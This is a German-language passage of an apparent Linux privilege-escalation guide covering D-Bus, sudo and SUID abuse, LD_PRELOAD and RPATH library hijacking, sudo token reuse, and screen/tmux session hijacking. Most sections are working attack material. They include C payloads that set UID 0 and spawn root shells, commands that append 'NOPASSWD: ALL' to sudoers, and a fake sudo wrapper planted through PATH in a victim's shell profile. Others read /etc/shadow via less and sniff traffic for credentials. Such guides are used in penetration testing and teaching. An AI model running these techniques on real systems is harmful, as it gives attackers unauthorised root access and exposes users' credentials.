D-Bus ist ein ausgeklügeltes Interprozess-Kommunikationssystem (IPC), das Anwendungen ermöglicht, effizient zu interagieren und Daten auszutauschen. Für moderne Linux-Systeme konzipiert, bietet es ein robustes Framework für verschiedene Formen der Anwendungs-Kommunikation.

Das System ist vielseitig und unterstützt grundlegende IPC, die den Datenaustausch zwischen Prozessen verbessert, vergleichbar mit erweiterten UNIX-Domain-Sockets. Darüber hinaus hilft es beim Broadcasten von Events oder Signalen, was eine nahtlose Integration von Systemkomponenten fördert. Zum Beispiel kann ein Signal eines Bluetooth-Daemons über einen eingehenden Anruf einen Musikplayer stummschalten und so das Benutzererlebnis verbessern. Außerdem unterstützt D-Bus ein Remote-Object-System, das Service-Anfragen und Methodenausführungen zwischen Anwendungen vereinfacht und Prozesse optimiert, die traditionell komplex waren.

D-Bus arbeitet nach einem **allow/deny model**, wobei Nachrichtenberechtigungen (Methodenaufrufe, Signalübertragungen usw.) basierend auf der kumulativen Wirkung übereinstimmender Richtlinienregeln verwaltet werden. Diese Richtlinien legen Interaktionen mit dem Bus fest und können unter Umständen eine privilege escalation ermöglichen, wenn diese Berechtigungen ausgenutzt werden.

Ein Beispiel für eine solche Richtlinie in `/etc/dbus-1/system.d/wpa_supplicant.conf` wird gezeigt und beschreibt Berechtigungen, die es dem root-Benutzer ermöglichen, `fi.w1.wpa_supplicant1` zu besitzen, Nachrichten an diese zu senden und von dieser zu empfangen.

Richtlinien ohne angegebenen Benutzer oder Gruppe gelten universell, während "default"-Kontext-Richtlinien für alle gelten, die nicht durch andere spezifische Richtlinien abgedeckt sind.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Lerne hier, wie man eine D-Bus-Kommunikation enumerate und exploit:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine herauszufinden.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Prüfe immer Netzwerkdienste, die auf der Maschine laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Überprüfe, ob du Traffic sniffen kannst. Wenn ja, könntest du einige Credentials grabben.
```
timeout 1 tcpdump
```
## Benutzer

### Generische Enumeration

Überprüfe, **wer** du bist, welche **Privilegien** du hast, welche **Benutzer** im System vorhanden sind, welche sich **anmelden** können und welche **root-Rechte** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Große UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** ermöglicht, Privilegien zu eskalieren. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Ausnutzen mit:** **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du Mitglied einer **Gruppe** bist, die dir root-Rechte gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Überprüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **irgendein Passwort** der Umgebung kennst, **versuche dich mit diesem Passwort bei jedem Benutzer einzuloggen**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu erzeugen, und die Binaries `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer per brute-force mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) anzugreifen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem Parameter `-a` ebenfalls, Benutzer per brute-force anzugreifen.

## Ausnutzung beschreibbarer $PATH

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben kannst**, könntest du möglicherweise Privilegien eskalieren, indem du **eine backdoor im beschreibbaren Ordner erstellst**, die den Namen eines Kommandos trägt, das von einem anderen Benutzer (idealerweise root) ausgeführt wird und das **nicht aus einem Verzeichnis geladen wird, das vor** deinem beschreibbaren Ordner im $PATH steht.

### SUDO und SUID

Du könntest berechtigt sein, ein Kommando mit sudo auszuführen, oder Dateien könnten das suid-Bit gesetzt haben. Überprüfe es mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Manche **unerwarteten Befehle erlauben es, Dateien zu lesen und/oder zu schreiben oder sogar Befehle auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die Sudo-Konfiguration könnte es einem Benutzer erlauben, einen Befehl mit den Privilegien eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen, es ist nun trivial, eine Shell zu erhalten, indem man einen ssh key in das Root-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt dem Benutzer, **eine Umgebungsvariable zu setzen**, während er etwas ausführt:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf der HTB-Maschine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, um eine beliebige python-Bibliothek zu laden, während das Skript als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV erhalten durch sudo env_keep → root shell

Wenn sudoers `BASH_ENV` beibehält (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du das nicht-interaktive Startup-Verhalten von Bash ausnutzen, um beliebigen Code als root auszuführen, wenn du einen erlaubten Befehl aufrufst.

- Why it works: For non-interactive shells, Bash evaluates `$BASH_ENV` and sources that file before running the target script. Many sudo rules allow running a script or a shell wrapper. If `BASH_ENV` is preserved by sudo, your file is sourced with root privileges.

- Requirements:
- A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
- `BASH_ENV` present in `env_keep` (check with `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Entfernen Sie `BASH_ENV` (und `ENV`) aus `env_keep`, bevorzugen Sie `env_reset`.
- Vermeiden Sie Shell-Wrapper für von sudo erlaubte Befehle; verwenden Sie minimale Binaries.
- Erwägen Sie sudo I/O-Logging und Alarmierung, wenn beibehaltene env vars verwendet werden.

### Sudo-Ausführungs-Umgehungspfade

**Springen Sie**, um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary ohne Pfad zum Befehl

Wenn die **sudo permission** für einen einzelnen Befehl **ohne Angabe des Pfades** gewährt wird: _hacker10 ALL= (root) less_ kann man das ausnutzen, indem man die PATH-Variable ändert.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid** binary **einen anderen Befehl ausführt, ohne den Pfad anzugeben (prüfe immer mit** _**strings**_ **den Inhalt eines seltsamen SUID binary)**).

[Beispiele für Payloads zum Ausführen.](payloads-to-execute.md)

### SUID binary mit angegebenem Pfad zum Befehl

Wenn das **suid** binary **einen anderen Befehl mit angegebenem Pfad ausführt**, dann kannst du versuchen, **export a function** zu erstellen, die den Namen des vom suid-File aufgerufenen Befehls trägt.

Zum Beispiel, wenn ein suid binary _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn man das suid binary aufruft, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere shared libraries (.so-Dateien) anzugeben, die vom loader vor allen anderen, einschließlich der Standard-C-Bibliothek (`libc.so`), geladen werden sollen. Dieser Vorgang wird als Vorladen einer Bibliothek bezeichnet.

Um die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion – insbesondere bei **suid/sgid**-ausführbaren Dateien – ausgenutzt wird, setzt das System jedoch bestimmte Bedingungen durch:

- Der loader ignoriert **LD_PRELOAD** für ausführbare Dateien, bei denen die real user ID (_ruid_) nicht mit der effective user ID (_euid_) übereinstimmt.
- Bei ausführbaren Dateien mit suid/sgid werden nur Bibliotheken in Standardpfaden vorgeladen, die ebenfalls suid/sgid sind.

Privilege Escalation kann auftreten, wenn du in der Lage bist, Befehle mit `sudo` auszuführen und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt, dass die Umgebungsvariable **LD_PRELOAD** erhalten bleibt und selbst bei Ausführung von Befehlen mit `sudo` berücksichtigt wird, was potenziell zur Ausführung beliebigen Codes mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichere als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Ein ähnlicher privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH**-Umgebungsvariable kontrolliert, da er den Pfad kontrolliert, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn man auf ein Binary mit **SUID**-Rechten trifft, das ungewöhnlich erscheint, ist es gute Praxis zu prüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich überprüfen, indem man den folgenden Befehl ausführt:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Beispielsweise deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf eine mögliche Ausnutzbarkeit hin.

Um dies auszunutzen, erstellt man eine C-Datei, z. B. _"/path/to/.config/libcalc.c"_, die folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code hat zum Ziel, nach Kompilierung und Ausführung Privilegien zu erhöhen, indem er Dateiberechtigungen manipuliert und eine Shell mit erhöhten Rechten startet.

Kompiliere die obige C-Datei in eine Shared-Object (.so)-Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen des betroffenen SUID-Binary den exploit auslösen und so eine mögliche system compromise ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine Bibliothek aus einem Verzeichnis lädt, in das wir schreiben können, erstellen wir die Bibliothek in diesem Verzeichnis mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn du einen Fehler wie
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die erzeugte Bibliothek eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um eingeschränkte Shells zu verlassen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, bind- und reverse-shells zu erzeugen und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du Zugriff auf `sudo -l` hast, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es herausfindet, wie eine sudo-Regel ausgenutzt werden kann.

### Reusing Sudo Tokens

In Fällen, in denen du **sudo access** hast, aber nicht das Passwort, kannst du Privilegien eskalieren, indem du **auf die Ausführung eines sudo-Kommandos wartest und dann das Session-Token kaperst**.

Voraussetzungen zur Eskalation von Rechten:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat in den **letzten 15mins** **`sudo` verwendet**, um etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` ohne Eingabe eines Passworts zu verwenden)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (du kannst es hochladen)

(Du kannst `ptrace_scope` temporär mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` modifizieren und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **first exploit** (`exploit.sh`) wird die Binärdatei `activate_sudo_token` in _/tmp_ erstellen. Du kannst sie benutzen, um das **sudo token in deiner Sitzung zu aktivieren** (du erhältst nicht automatisch eine root shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite exploit** (`exploit_v2.sh`) erstellt eine sh shell in _/tmp_ **im Besitz von root mit setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird eine **sudoers file** erstellen, die **sudo tokens dauerhaft macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn du **Schreibberechtigungen** im Ordner oder für eine der darin erstellten Dateien hast, kannst du das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **einen sudo token für einen Benutzer und eine PID zu erstellen**.\
Zum Beispiel, wenn du die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine Shell als dieser Benutzer mit PID 1234 hast, kannst du **sudo-Rechte erlangen**, ohne das Passwort zu kennen, indem du:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` legen fest, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und von der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du irgendeine Datei **schreiben** kannst, kannst du **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum `sudo`-Binary, wie `doas` für OpenBSD. Vergiss nicht, dessen Konfiguration in `/etc/doas.conf` zu prüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **Benutzer sich üblicherweise mit einer Maschine verbindet und `sudo`** benutzt, um Privilegien zu eskalieren, und du eine Shell im Kontext dieses Benutzers erhalten hast, kannst du **ein neues sudo executable** erstellen, das zuerst deinen Code als root und anschließend den Befehl des Benutzers ausführt. Dann **ändere den $PATH** des Benutzerkontexts (zum Beispiel indem du den neuen Pfad in .bash_profile hinzufügst), sodass beim Ausführen von sudo dein sudo executable gestartet wird.

Beachte, dass du, falls der Benutzer eine andere Shell (nicht bash) verwendet, andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifiziert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` eingelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Libraries** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Libraries innerhalb von `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einem der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, irgendeiner Datei innerhalb von `/etc/ld.so.conf.d/` oder einem Ordner, der in den Konfigurationsdateien unter `/etc/ld.so.conf.d/*.conf` angegeben ist, könnte er möglicherweise Privilegien eskalieren.\
Sieh dir an, **wie man diese Fehlkonfiguration ausnutzt** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Wenn man die lib nach `/var/tmp/flag15/` kopiert, wird sie vom Programm an dieser Stelle verwendet, wie in der `RPATH`-Variable angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities stellen eine **Teilmenge der verfügbaren root-Privilegien für einen Prozess** bereit. Dadurch werden root **Privilegien in kleinere und unterscheidbare Einheiten** aufgeteilt. Jede dieser Einheiten kann dann unabhängig Prozessen gewährt werden. Auf diese Weise wird die Gesamtheit der Privilegien reduziert, wodurch das Risiko einer Ausnutzung verringert wird.\
Lies die folgende Seite, um **mehr über capabilities und deren Missbrauch zu erfahren**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisberechtigungen

In einem Verzeichnis bedeutet das **Bit für "execute"**, dass der betreffende Benutzer in das Verzeichnis "**cd**" wechseln kann.\
Das **"read"**-Bit bedeutet, dass der Benutzer die **Dateien** **auflisten** kann, und das **"write"**-Bit bedeutet, dass der Benutzer **Dateien** **löschen** und **neu erstellen** kann.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der diskretionären Berechtigungen dar und sind in der Lage, **die traditionellen ugo/rwx-Berechtigungen außer Kraft zu setzen**. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte gewähren oder verweigern. Dieses Maß an **Feingranularität sorgt für eine präzisere Zugriffsverwaltung**. Weitere Details finden sich [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibrechte für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Abrufen** von Dateien mit bestimmten ACLs vom System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

In **älteren Versionen** kannst du möglicherweise einen **hijack** an einer **shell**-Session eines anderen Users (**root**) vornehmen.\
In **neuesten Versionen** kannst du dich nur noch zu screen sessions deines **eigenen Users** **connect**. Allerdings könntest du **interessante Informationen innerhalb der Session** finden.

### screen sessions hijacking

**Screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine Session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem bei **old tmux versions**. Ich konnte eine tmux (v2.1) session, die von root erstellt wurde, nicht hijacken, wenn ich als non-privileged user angemeldet war.

**tmux sessions auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Sitzung anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Siehe **Valentine box from HTB** als Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Keys, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc.) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Bug betroffen sein.\
Dieser Bug tritt beim Erstellen eines neuen ssh-Key auf diesen OS auf, da **nur 32.768 Varianten möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn man den ssh public key hat, kann man nach dem entsprechenden private key suchen**. Die berechneten Möglichkeiten finden Sie hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante Konfigurationswerte

- **PasswordAuthentication:** Gibt an, ob Passwort-Authentifizierung erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Gibt an, ob Public-Key-Authentifizierung erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, legt diese Option fest, ob der Server Logins zu Accounts mit leeren Passwort-Strings erlaubt. Der Standard ist `no`.

### PermitRootLogin

Gibt an, ob root sich per ssh einloggen kann; Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit password und private key einloggen
- `without-password` or `prohibit-password`: root kann sich nur mit einem private key einloggen
- `forced-commands-only`: root kann sich nur mit private key einloggen und nur, wenn die command-Optionen angegeben sind
- `no` : nicht erlaubt

### AuthorizedKeysFile

Gibt Dateien an, die die public keys enthalten, die für die Benutzer-Authentifizierung verwendet werden können. Sie kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **You can indicate absolute paths** (beginnt mit `/`) oder **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass wenn du versuchst, dich mit dem **private** Key des Benutzers "**testusername**" einzuloggen, ssh den **public** Key deines Keys mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleicht.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding erlaubt es dir, **use your local SSH keys instead of leaving keys** (without passphrases!) auf deinem Server liegen zu lassen. So wirst du in der Lage sein, per ssh **jump** zu einem **host** zu gehen und von dort **jump to another** **host** **using** den **key** auf deinem **initial host**.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` `*` ist, jedes Mal, wenn der Benutzer zu einer anderen Maschine wechselt, dieser Host auf die Keys zugreifen kann (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann **diese Optionen überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann **ssh-agent forwarding** mit dem Keyword `AllowAgentForwarding` erlauben oder verhindern (Standard ist allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **du es möglicherweise missbrauchen kannst, um Privilegien zu eskalieren**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du **eine von ihnen schreiben oder ändern kannst, kannst du Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profil-Skript gefunden wird, solltest du es auf **sensible Details** überprüfen.

### Passwd/Shadow-Dateien

